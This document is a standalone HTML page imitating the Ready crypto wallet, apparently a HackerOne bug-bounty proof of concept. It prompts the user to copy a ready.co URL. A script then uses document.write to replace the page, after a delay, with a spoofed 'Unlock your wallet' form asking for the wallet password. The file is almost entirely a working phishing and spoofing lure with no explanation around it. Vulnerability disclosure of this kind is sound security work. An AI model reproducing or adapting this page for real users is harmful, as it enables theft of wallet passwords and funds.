<!DOCTYPE html>
<html>
  <head>
    <title>Ready Login</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #000000;
        padding: 40px;
        text-align: center;
      }
      .card {
        background-color: #1a1a1a;
        max-width: 420px;
        margin: auto;
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 4px 12px rgba(255, 107, 53, 0.3);
      }
      .metamask-logo {
        width: 80px;
        margin-bottom: 15px;
      }
      h2 {
        color: #ffffff;
        margin-bottom: 10px;
      }
      p {
        font-size: 15px;
        color: #cccccc;
        margin-bottom: 20px;
      }
      .url-box {
        background: #2a2a2a;
        padding: 12px;
        border-radius: 6px;
        font-family: monospace;
        font-size: 14px;
        color: #ffffff;
        word-break: break-all;
        border: 1px solid #333;
      }
      button {
        background-color: #ff6b35;
        color: white;
        padding: 10px 20px;
        border: none;
        border-radius: 6px;
        font-size: 14px;
        cursor: pointer;
        margin-top: 20px;
      }
      .login-container {
        max-width: 380px;
        margin: 60px auto;
        background: #1a1a1a;
        padding: 30px;
        border-radius: 10px;
        text-align: center;
        box-shadow: 0 2px 10px rgba(255, 107, 53, 0.2);
      }
      .login-container input {
        width: 90%;
        margin: 10px auto;
        padding: 10px;
        font-size: 14px;
        border: 1px solid #333;
        background: #2a2a2a;
        color: #ffffff;
        border-radius: 6px;
        display: block;
      }
      .login-container button {
        background-color: #ff6b35;
        border: none;
        padding: 10px 16px;
        border-radius: 6px;
        color: white;
        font-size: 15px;
        cursor: pointer;
      }
      .footer {
        font-size: 11px;
        color: #888;
        margin-top: 15px;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <img class="metamask-logo" src="https://cdn.prod.website-files.com/680f9220d4668b0e40862420/68501db2b0ca6f407c20579f_ready-logo-linear-inverted.svg" alt="Ready Logo">
      <h2>Connect with Ready</h2>
      <p>Copy and paste the URL below into your browser's address bar:</p>
      <div class="url-box" id="304url">https://ready.co:1234</div>
      <button onclick="copyUrl()">📋 Copy URL</button>
    </div>

    <script>
      function copyUrl() {
        const url = document.getElementById("304url");
        if (!window.getSelection) return;
        const range = document.createRange();
        range.selectNodeContents(url);
        const sel = window.getSelection();
        sel.removeAllRanges();
        sel.addRange(range);
        document.execCommand("copy");

        setTimeout(() => {
          document.write(`
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #000000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background: #1a1a1a;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 5px 25px rgba(255, 107, 53, 0.3);
      text-align: center;
      width: 300px;
    }

    .metamask-logo {
      width: 80px;
      margin-bottom: 10px;
    }

    h2 {
      margin: 10px 0;
      color: #ffffff;
    }

    p {
      color: #cccccc;
      margin-bottom: 20px;
    }

    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #333;
      background: #2a2a2a;
      color: #ffffff;
      border-radius: 8px;
      font-size: 14px;
    }

    input[type="password"]::placeholder {
      color: #888;
    }

    button {
      width: 100%;
      padding: 10px;
      background: #ff6b35;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background: #e55a25;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #888;
    }
  </style>

  <div class="login-container">
    <img class="metamask-logo" src="https://cdn.prod.website-files.com/680f9220d4668b0e40862420/68501db2b0ca6f407c20579f_ready-logo-linear-inverted.svg" alt="Ready Logo">
    <h2>Ready</h2>
    <p>Unlock your wallet</p>
    <input type="password" placeholder="Enter your wallet password" />
    <button type="submit">Unlock</button>
    <div class="footer">HackerOne Bug Bounty</div>
  </div>
`);
        }, 4300);
      }
    </script>
  </body>
</html>
